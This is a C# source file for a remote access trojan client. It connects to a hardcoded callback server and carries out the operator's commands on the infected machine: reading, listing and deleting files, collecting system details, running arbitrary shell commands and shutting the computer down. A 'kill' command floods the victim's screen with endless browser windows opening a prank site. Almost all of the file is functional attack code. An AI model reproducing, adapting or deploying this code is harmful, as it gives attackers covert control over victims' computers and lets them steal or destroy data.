using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using GeneralPurposeLib;

namespace RAT; 

public static class RatHandler {
    private const string ServerHost = "ratcallback.serble.net";
    private const int ServerPort = 6083;
    
    private static string ReceiveMessage(Stream stream) {
        // Read until we get a newline
        StringBuilder cmdBuilder = new();
        while (true) {
            int b = stream.ReadByte();
            if (b == -1) {
                break;
            }
            if (b == '\n') {
                break;
            }
            cmdBuilder.Append((char)b);
        }
        // Replace all escaped newlines with real newlines
        return cmdBuilder.Replace("\\n", "\n").ToString();
    }
    
    private static void SendMessage(Stream socket, string data) {
        // Escape the newline character
        data = data.Replace("\n", "\\n");
        // Send the data
        socket.Write(Encoding.UTF8.GetBytes(data + "\n"));
    }

    public static Task ExecuteAsync(CancellationToken stoppingToken) {
        while (!stoppingToken.IsCancellationRequested) {
            try {
                ExecuteRat(stoppingToken).Wait(stoppingToken);
            }
            catch (OperationCanceledException e) {
                Logger.Info($"Exiting... ({e.Message})");
                break;
            }
            catch (AggregateException e) {
                bool exit = false;
                foreach (Exception exception in e.InnerExceptions) {
                    if (exception is not OperationCanceledException) continue;
                    Logger.Info($"Exiting... ({exception.Message})");
                    exit = true;
                    break;
                }
                if (exit) break;
                Logger.Error(e.ToString());
                Logger.Info("Reconnecting in 5 seconds");
                Thread.Sleep(5000);
                Logger.Info("Reconnecting...");
            }
        }

        return Task.CompletedTask;
    }

    private static async Task ExecuteRat(CancellationToken stoppingToken) {
        Logger.Info("RAT worker started");

        TcpClient client = new();
        await client.ConnectAsync(ServerHost, ServerPort, stoppingToken);
        Logger.Info("Connected to RAT server");

        while (!stoppingToken.IsCancellationRequested) {
            NetworkStream stream = client.GetStream();
            
            string message = ReceiveMessage(stream);
            Logger.Info(message);
            
            // Process command
            string[] args = message.Split(' ');
            string argsCombined = string.Join(' ', args[1..]);
            string outData = "";
            switch (args[0]) {
                    
                default:
                    // Send error message
                    outData = "ERROR: Unknown command";
                    break;

                case "type":
                case "cat":
                case "print": {
                    // Prints the contents of a file
                    if (args.Length < 2) {
                        outData = "ERROR: Not enough arguments";
                        break;
                    }
                    if (!File.Exists(argsCombined)) {
                        outData = "ERROR: File does not exist";
                        break;
                    }
                    outData = await File.ReadAllTextAsync(argsCombined, stoppingToken);
                    break;
                }

                case "whotfisthis":
                case "info": {
                    // Display info about the system
                    string os = RuntimeInformation.OSDescription;
                    string arch = RuntimeInformation.OSArchitecture.ToString();
                    string version = Environment.OSVersion.VersionString;
                    string user = Environment.UserName;
                    string is64BitProcess = Environment.Is64BitProcess ? "64-bit" : "32-bit";
                    string currentDirectory = Environment.CurrentDirectory;
                    string systemDirectory = Environment.SystemDirectory;
                    string machineName = Environment.MachineName;
                    string systemCpuCount = Environment.ProcessorCount.ToString();
                    string ratUptime = (DateTime.Now - Process.GetCurrentProcess().StartTime).ToFormat("{d} days, {h} hours, {m} minutes, {s} seconds");
                    string systemUptime = TimeSpan.FromMilliseconds(Environment.TickCount).ToFormat("{d} days, {h} hours, {m} minutes, {s} seconds");
                    outData = $"Machine Name: {machineName}\n" +
                              $"OS: {os}\n" +
                              $"OS Version: {version}\n" +
                              $"Process Architecture: {is64BitProcess}\n" +
                              $"Architecture: {arch}\n" +
                              $"Current User: {user}\n" +
                              $"Current Directory: {currentDirectory}\n" +
                              $"System Directory: {systemDirectory}\n" +
                              $"Processor Count: {systemCpuCount}\n" +
                              $"RAT Uptime: {ratUptime}\n" +
                              $"System Uptime: {systemUptime}";
                    break;
                }

                case "showmewhatfuckingfilesareonthiscomputer":
                case "dir":
                case "ls": {
                    string[] directories = Directory.GetDirectories(args.Length > 1 ? args[1] : ".");
                    string[] files = Directory.GetFiles(args.Length > 1 ? args[1] : ".");
                    outData = "Directories:\n" +
                              string.Join("\n", directories) + "\n" +
                              "Files:\n" +
                              string.Join("\n", files);
                    break;
                }
                
                case "cd": {
                    if (args.Length < 2) {
                        outData = Directory.GetCurrentDirectory();
                        break;
                    }
                    try {
                        Directory.SetCurrentDirectory(argsCombined);
                        outData = "OK";
                    }
                    catch (Exception e) {
                        outData = $"ERROR: {e.Message}";
                    }
                    break;
                }

                case "rm":
                case "del": {
                    if (args.Length < 2) {
                        outData = "ERROR: No file or directory specified";
                        break;
                    }

                    if (!File.Exists(argsCombined) && !Directory.Exists(argsCombined)) {
                        outData = "ERROR: File or directory does not exist";
                        break;
                    }
                    
                    try {
                        if (File.Exists(argsCombined)) {
                            File.Delete(argsCombined);
                        }
                        else {
                            Directory.Delete(argsCombined, true);
                        }
                        outData = "OK";
                    }
                    catch (Exception e) {
                        outData = $"ERROR: {e.Message}";
                    }
                    break;
                }

                case "ping":
                    // Send pong message
                    outData = "pong";
                    break;

                case "init":
                    // Send initialization message
                    string id = Guid.NewGuid().ToString();
                    if (File.Exists("id.txt")) {
                        id = await File.ReadAllTextAsync("id.txt", stoppingToken);
                    }
                    else {
                        await File.WriteAllTextAsync("id.txt", id, stoppingToken);
                    }
                    outData = id;
                    break;

                case "run": {
                    // Run command
                    string command = message[(message.IndexOf(' ') + 1)..];
                    OsPlatform osr = GetPlatform();
                    string cmdExecutorBeginr = osr switch {
                        OsPlatform.Windows => "cmd.exe",
                        OsPlatform.Linux => "bash",
                        OsPlatform.OSX => "bash",
                        _ => "bash"
                    };
                    string specialFlagsr = osr switch {
                        OsPlatform.Windows => "/c",
                        OsPlatform.Linux => "-c",
                        OsPlatform.OSX => "-c",
                        _ => "-c"
                    };
                    try {
                        Process process = Process.Start(new ProcessStartInfo {
                            FileName = cmdExecutorBeginr, Arguments = $"{specialFlagsr} \"{command}\"",
                            UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                        })!;

                        Logger.Info("Running command: " + command);
                        // Get process output
                        await process.WaitForExitAsync(stoppingToken);
                        string output = await process.StandardOutput.ReadToEndAsync();
                        string error = await process.StandardError.ReadToEndAsync();
                        output = output == "" ? error == "" ? "No output" : error : output;
                        // Send output message
                        outData = output;
                        Logger.Info("Command output: " + output);
                    }
                    catch (Exception e) {
                        Logger.Error(e);
                        // Send error message
                        await stream.WriteAsync(Encoding.UTF8.GetBytes("Error: " + e.Message), stoppingToken);
                    }

                    break;
                }

                case "begin": {
                    // Run command
                    string commandBegin = message[(message.IndexOf(' ') + 1)..];
                    OsPlatform os = GetPlatform();
                    string cmdExecutorBegin = os switch {
                        OsPlatform.Windows => "cmd.exe",
                        OsPlatform.Linux => "bash",
                        OsPlatform.OSX => "bash",
                        _ => "bash"
                    };
                    string specialFlags = os switch {
                        OsPlatform.Windows => "/c",
                        OsPlatform.Linux => "-c",
                        OsPlatform.OSX => "-c",
                        _ => "-c"
                    };
                    try {
                        Process process = Process.Start(new ProcessStartInfo {
                            FileName = cmdExecutorBegin, Arguments = $"{specialFlags} \"{commandBegin}\"",
                            UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                        })!;

                        Logger.Info("Running command: " + commandBegin);
                        outData = "Started execution";
                    }
                    catch (Exception e) {
                        Logger.Error(e);
                        // Send error message
                        await stream.WriteAsync(Encoding.UTF8.GetBytes("Error: " + e.Message), stoppingToken);
                    }

                    break;
                }

                case "continue":
                    break;
                
                case "quit":
                    throw new OperationCanceledException("RAT server requested shutdown of client");

                case "kill": {
                    OsPlatform osPlatform = GetPlatform();
                    Thread thread = new(() => {
                        Kill(osPlatform);
                    });
                    thread.Start();
                    outData = "Commiting suicide in 5 seconds...";
                    break;
                }

                case "latency": {
                    // Respond with the current time
                    outData = DateTime.Now.ToBinary().ToString();
                    break;
                }

                case "shutdown": {
                    // Shutdown the computer
                    OsPlatform osPlatform = GetPlatform();
                    string shutdownCommand = osPlatform switch {
                        OsPlatform.Windows => "shutdown -s -t 0",
                        OsPlatform.Linux => "shutdown -h now",
                        OsPlatform.OSX => "shutdown -h now",
                        _ => "shutdown -h now"
                    };
                    string cmd = osPlatform switch {
                        OsPlatform.Windows => "cmd.exe",
                        OsPlatform.Linux => "bash",
                        OsPlatform.OSX => "bash",
                        _ => "bash"
                    };
                    string specialFlags = osPlatform switch {
                        OsPlatform.Windows => "/c",
                        OsPlatform.Linux => "-c",
                        OsPlatform.OSX => "-c",
                        _ => "-c"
                    };
                    Process process = Process.Start(new ProcessStartInfo {
                        FileName = cmd, Arguments = $"{specialFlags} {shutdownCommand}",
                        UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                    })!;
                    break;
                }
            }
            
            SendMessage(stream, outData);
        }
        
    }

    private static void Kill(OsPlatform platform) {
        // Wait 5 seconds before killing so that the response can be sent
        Logger.Warn("Commiting suicide in 5 seconds...");
        Thread.Sleep(5000);

        switch (platform) {

            case OsPlatform.Windows: {
                while (true) {
                    _ = Process.Start(new ProcessStartInfo {
                        FileName = "cmd.exe", Arguments = "/c start https://youareanidiot.cc/",
                        UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                    })!;
                }
            }

            case OsPlatform.OSX:
            case OsPlatform.Linux: {
                while (true) {
                    _ = Process.Start(new ProcessStartInfo {
                        FileName = "xdg-open", Arguments = "https://youareanidiot.cc/",
                        UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                    })!;
                }
            }

            case OsPlatform.Unknown:
                // Uh, idk what to do
                break;
            
            default:
                throw new ArgumentOutOfRangeException(nameof(platform), platform, null);
        }
    }
    
    private static OsPlatform GetPlatform() {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
            return OsPlatform.Windows;
        }
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) {
            return OsPlatform.Linux;
        }
        return RuntimeInformation.IsOSPlatform(OSPlatform.OSX) ? OsPlatform.OSX : OsPlatform.Unknown;
    }
}